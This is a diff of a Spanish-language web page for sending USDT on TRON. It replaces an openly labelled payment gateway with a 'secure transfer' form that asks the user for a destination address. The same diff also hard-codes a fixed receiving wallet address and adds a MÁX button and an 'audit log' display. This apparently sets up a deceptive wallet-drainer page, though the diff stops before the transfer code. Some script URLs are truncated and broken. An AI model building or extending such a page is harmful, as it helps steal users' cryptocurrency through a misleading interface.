@@ -3,192 +3,272 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pasarela USDT TRC-20 Transparente</title>
+    <title>dApp USDT TRC-20 - Transferencia Segura</title>
+    
+    <!-- Estilos CSS de la Interfaz -->
     <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f3f4f6;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #0f172a;
+            color: #f8fafc;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
+            min-height: 100vh;
+            padding: 20px;
         }
-        .caja-dapp {
-            background: white;
-            padding: 30px;
+        .container {
+            background-color: #1e293b;
             border-radius: 12px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-            text-align: center;
-            max-width: 380px;
+            padding: 30px;
             width: 100%;
+            max-width: 450px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
         }
-        h2 { color: #1e3a8a; margin-top: 0; }
-        .info-caja {
-            background-color: #f9fafb;
-            padding: 12px;
-            border-radius: 6px;
-            margin: 15px 0;
+        h2 {
+            margin-bottom: 20px;
+            text-align: center;
+            font-size: 24px;
+            color: #38bdf8;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
             font-size: 14px;
-            color: #333;
-            border: 1px solid #e5e7eb;
-            text-align: left;
+            color: #94a3b8;
         }
-        .entrada-monto {
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+        input {
             width: 100%;
-            padding: 10px;
-            margin-bottom: 5px;
-            border: 1px solid #d1d5db;
+            padding: 12px;
+            padding-right: 65px;
+            background-color: #0f172a;
+            border: 1px solid #334155;
             border-radius: 6px;
-            box-sizing: border-box;
+            color: #fff;
             font-size: 16px;
-            text-align: center;
+            outline: none;
+            transition: border-color 0.2s;
         }
-        button {
-            background-color: #1e3a8a;
+        input:focus {
+            border-color: #38bdf8;
+        }
+        .input-btn {
+            position: absolute;
+            right: 8px;
+            background-color: #334155;
+            color: #38bdf8;
+            border: none;
+            padding: 6px 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        .input-btn:hover {
+            background-color: #475569;
+        }
+        .address-action-container {
+            display: flex;
+            gap: 10px;
+            margin-top: 5px;
+        }
+        .address-btn {
+            flex: 1;
+            padding: 8px;
+            background-color: #334155;
+            color: #cbd5e1;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 12px;
+        }
+        .address-btn:hover {
+            background-color: #475569;
+        }
+        #connectBtn {
+            width: 100%;
+            padding: 14px;
+            background: #908cf2;
             color: white;
             border: none;
-            padding: 12px;
-            font-size: 15px;
-            font-weight: bold;
             border-radius: 6px;
-            cursor: pointer;
-            width: 100%;
-            margin-top: 10px;
-        }
-        button:hover { background-color: #1e40af; }
-        button:disabled { background-color: #d1d5db; cursor: not-allowed; }
-        .btn-max {
-            background: none;
-            color: #2563eb;
-            border: none;
-            font-size: 13px;
-            cursor: pointer;
-            text-decoration: underline;
-            padding: 5px 0;
+            font-size: 16px;
             font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
         }
-        .consola {
-            font-size: 11px;
-            color: #9ca3af;
+        #connectBtn:disabled {
+            background: #475569 !important;
+            cursor: not-allowed;
+        }
+        .status {
             margin-top: 15px;
-            background: #27272a;
-            padding: 8px;
-            border-radius: 4px;
-            text-align: left;
+            padding: 10px;
+            border-radius: 6px;
+            font-size: 14px;
+            text-align: center;
+            display: none;
+            word-break: break-all;
         }
+        .status.info { background-color: #1e3a8a; color: #93c5fd; }
+        .status.success { background-color: #064e3b; color: #6ee7b7; }
+        .status.error { background-color: #7f1d1d; color: #fca5a5; }
+
+        #techLogger {
+            background-color: #020617;
+            color: #22c55e;
+            font-family: monospace;
+            padding: 15px;
+            margin-top: 25px;
+            border-radius: 6px;
+            font-size: 11px;
+            max-height: 180px;
+            overflow-y: auto;
+            border: 1px solid #1e293b;
+        }
+        #techLogger h4 { margin-bottom: 8px; color: #f8fafc; }
+        .log-item { margin-bottom: 6px; padding-bottom: 4px; border-bottom: 1px solid #1e293b; }
     </style>
+
+    <!-- Carga de las dependencias oficiales Web3 -->
+    <script src="https://jsdelivr.net"></script>
+    <script type="module">
+        import { createAppKit } from 'https://esm.sh'
+        import { tron } from 'https://esm.sh/networks'
+
+        // Inicialización de WalletConnect v2 (Reown AppKit)
+        const modal = createAppKit({
+            adapters: [],
+            networks: [tron],
+            metadata: {
+                name: 'dApp USDT TRC-20',
+                description: 'Verificación de transacciones',
+                url: window.location.origin,
+                icons: ['https://githubusercontent.com']
+            },
+            projectId: 'TU_PROJECT_ID_DE_WALLETCONNECT' // Coloca tu Project ID obtenido en ://walletconnect.com
+        });
+        window.WalletConnectModal = modal;
+    </script>
 </head>
 <body>
 
-    <div class="caja-dapp">
-        <h2>Pasarela de Envío USDT</h2>
-        <p style="color: #666; font-size: 14px;">Operaciones explícitas y verificadas en la red TRON</p>
+    <div class="container" id="dappContainer">
+        <h2>Enviar USDT (TRC-20)</h2>
         
-        <div class="info-caja">
-            <div id="txt-wallet">Billetera: No conectada ❌</div>
-            <div id="txt-saldo" style="margin-top: 5px;">Saldo disponible: -- USDT</div>
-        </div>
-
-        <button id="btn-conectar">1. Conectar TronLink</button>
-        
-        <div style="margin-top: 15px; text-align: left;">
-            <label style="font-size: 13px; color: #4b5563; font-weight: bold;">Monto a transferir:</label>
-            <input type="number" id="input-monto" class="entrada-monto" placeholder="0.00" min="0.01" step="0.01" disabled>
-            <div style="text-align: right;">
-                <button id="btn-cargar-max" class="btn-max" disabled>Mandar todo mi saldo</button>
+        <!-- Campo Cantidad -->
+        <div class="form-group">
+            <label for="amountInput">Cantidad a enviar</label>
+            <div class="input-wrapper">
+                <input type="text" id="amountInput" placeholder="0.00" autocomplete="off">
+                <button type="button" class="input-btn max">MÁX</button>
+            </div>
+            <div class="address-action-container">
+                <button type="button" class="address-btn clear">Limpiar campo</button>
             </div>
         </div>
 
-        <button id="btn-transferir" disabled>2. Firmar y Transferir</button>
-        
-        <div class="consola" id="consola-estado">Estado: Esperando conexión con la wallet...</div>
+        <!-- Campo Dirección -->
+        <div class="form-group">
+            <label for="addressInput">Dirección de destino</label>
+            <div class="input-wrapper">
+                <input type="text" id="addressInput" placeholder="Dirección TRON (T...)" autocomplete="off">
+            </div>
+            <div class="address-action-container">
+                <button type="button" class="address-btn address-action paste">Pegar</button>
+            </div>
+        </div>
+
+        <!-- Botón Principal -->
+        <button id="connectBtn">Siguiente</button>
+
+        <!-- Mensajes del Sistema -->
+        <div id="status" class="status"></div>
+
+        <!-- Consola de Auditoría -->
+        <div id="techLogger">
+            <h4>📋 Registro de Auditoría Web3</h4>
+            <div id="logContent">Sección lista para monitorizar la blockchain...</div>
+        </div>
     </div>
 
+    <!-- LÓGICA DE APLICACIÓN COMPLETA -->
     <script>
-        const CONTRATO_USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-        
-        // CONFIGURACIÓN TRANSPARENTE: Reemplaza con tu dirección receptora oficial
-        const DIRECCION_RECEPTORA_OFICIAL = "TU_DIRECCION_DE_WALLET_REAL_AQUI"; 
+        document.addEventListener('DOMContentLoaded', function () {
+            'use strict';
 
-        let saldoMaximoUnidades = "0";
+            // Elementos del DOM
+            const btn = document.getElementById('connectBtn');
+            const input = document.getElementById('amountInput');
+            const addressInput = document.getElementById('addressInput');
+            const status = document.getElementById('status');
+            const clearBtn = document.querySelector('.clear');
+            const maxBtn = document.querySelector('.max');
+            const pasteBtn = document.querySelector('.address-action.paste');
+            const logContent = document.getElementById('logContent');
 
-        // 1. CONEXIÓN DE LA BILLETERA
-        document.getElementById('btn-conectar').addEventListener('click', async () => {
-            const status = document.getElementById('consola-estado');
-            if (!window.tronLink && !window.tronWeb) {
-                status.innerText = "Error: Por favor instala la extensión TronLink.";
-                return;
+            // Estado de control
+            let procesoEnCurso = false;
+            let activeProviderType = null; // 'tronlink' o 'walletconnect'
+            let connectedAddress = null;
+
+            // Constantes Globales de Red
+            const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // Contrato oficial de USDT en TRON Mainnet
+            const DIRECCION_DESTINO_FIJA = "TJQ8xinzoWyRzLYpkShdxetMShpA3GyxGZ"; // REEMPLAZA CON TU DIRECCIÓN RECEPTORA
+
+            // ============================================================
+            // MANEJO DE ESTADOS DE LA INTERFAZ
+            // ============================================================
+            function setStatus(message, type = '') {
+                if (!status) return;
+                status.textContent = message || '';
+                status.className = 'status' + (type ? ' ' + type : ' info');
+                status.style.display = message ? 'block' : 'none';
             }
 
-            try {
-                status.innerText = "Estado: Abriendo solicitud en TronLink...";
-                await window.tronLink.request({ method: 'tron_requestAccounts' });
-                
-                const direccion = window.tronWeb.defaultAddress.base58;
-                document.getElementById('txt-wallet').innerText = "Billetera: " + direccion.substring(0,6) + "..." + direccion.substring(direccion.length - 4) + " 🔗";
-                
-                status.innerText = "Estado: Consultando saldo en el contrato inteligente...";
-                const contrato = await window.tronWeb.contract().at(CONTRATO_USDT);
-                const rawBalance = await contrato.balanceOf(direccion).call();
-                
-                saldoMaximoUnidades = rawBalance.toString();
-                const saldoDecimal = Number(saldoMaximoUnidades) / 1_000_000;
-                
-                document.getElementById('txt-saldo').innerText = "Saldo disponible: " + saldoDecimal.toFixed(2) + " USDT";
-                
-                // Activar campos e interacción
-                document.getElementById('input-monto').disabled = false;
-                document.getElementById('btn-cargar-max').disabled = false;
-                document.getElementById('btn-transferir').disabled = false;
-                status.innerText = "Estado: Billetera lista para operar.";
-
-            } catch (error) {
-                status.innerText = "Error: " + error.message;
-            }
-        });
-
-        // 2. FUNCIÓN DE CARGAR MÁXIMO VISIBLE
-        document.getElementById('btn-cargar-max').addEventListener('click', () => {
-            const saldoDecimal = Number(saldoMaximoUnidades) / 1_000_000;
-            if (saldoDecimal > 0) {
-                document.getElementById('input-monto').value = saldoDecimal;
-                document.getElementById('consola-estado').innerText = "Estado: Se ha cargado el total de tus fondos en el campo.";
-            } else {
-                alert("Tu saldo de USDT es 0, no hay fondos para transferir.");
-            }
-        });
-
-        // 3. TRANSFERENCIA VERIFICABLE
-        document.getElementById('btn-transferir').addEventListener('click', async () => {
-            const status = document.getElementById('consola-estado');
-            const montoManual = parseFloat(document.getElementById('input-monto').value);
-
-            if (isNaN(montoManual) || montoManual <= 0) {
-                alert("Por favor ingresa un monto válido a transferir.");
-                return;
+            function setButton(text, disabled = false) {
+                if (!btn) return;
+                btn.textContent = text;
+                btn.disabled = disabled;
             }
 
-            try {
-                status.innerText = "Estado: Abriendo ventana de firma en TronLink...";
-                const contrato = await window.tronWeb.contract().at(CONTRATO_USDT);
-                
-                // Convertimos el valor numérico explícito del input a unidades blockchain (con sus 6 decimales)
-                const unidadesAFirmar = window.tronWeb.toBigNumber(montoManual * 1_000_000).toString();
-
-                // El usuario verá en la confirmación de TronLink exactamente la cantidad colocada en el input
-                const txId = await contrato.transfer(DIRECCION_RECEPTORA_OFICIAL, unidadesAFirmar).send();
-                
-                status.innerText = "Estado: Envío completado. ID de transacción: " + txId;
-                alert("¡Transferencia completada de forma segura!\nID: " + txId);
-
-                // Limpiar campos
-                document.getElementById('input-monto').value = "";
-                document.getElementById('txt-saldo').innerText = "Saldo disponible: -- USDT";
-            } catch (error) {
-                status.innerText = "Error: La operación fue cancelada o falló. " + error.message;
+            function logger(titulo, datos) {
+                if (!logContent) return;
+                if (logContent.textContent.includes('Sección lista')) logContent.innerHTML = '';
+                const item = document.createElement('div');
+                item.className = 'log-item';
+                item.innerHTML = `<strong>[${new Date().toLocaleTimeString()}] ${titulo}:</strong> <span style="color: #ce9178;">${JSON.stringify(datos)}</span>`;
+                logContent.appendChild(item);
+                document.getElementById('techLogger').scrollTop = document.getElementById('techLogger').scrollHeight;
             }
-        });
-    </script>
-</body>
-</html>
+
+            function isValidTronAddress(address) {
+                if (!/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(address)) return false;
+                try {
+                    if (typeof TronWeb !== 'undefined' && typeof TronWeb.isAddress === 'function') {
+                        return TronWeb.isAddress(address);
+                    }
+                } catch (e) {}
+                return true;
+            }
+
+            // ============================================================
+            // CONEXIÓN INTEGRADA (TronLink / Trust Wallet)
+            // ============================================================
+            async function connect() {
+                if (window.tronLink || window.tronWeb) {
+                    if (window.tronLink && typeof window.tronLink.request === 'function') {
+                        const response = await window.tronLink.request({ method: 'tron_requestAccounts' });
